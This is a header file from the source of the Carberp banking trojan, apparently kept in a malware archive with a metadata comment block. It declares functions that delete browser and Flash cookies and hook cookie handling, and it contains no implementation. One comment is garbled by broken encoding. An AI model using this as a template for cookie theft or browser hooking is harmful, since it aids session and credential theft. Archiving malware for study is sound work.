/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

#include "windows.h"

// ������� ������� ������ ��������� � Macromedia Flash Player
void WINAPI DeleteBrowsersCookies();

bool DeleteFFCookies();
bool DeleteSOL();

BOOL Delete_IECookies_Norm(BOOL bDeleteCookies, BOOL bDeleteCookiesIndex);

BOOL Delete_IECookies_Vista();
bool HookCookie();



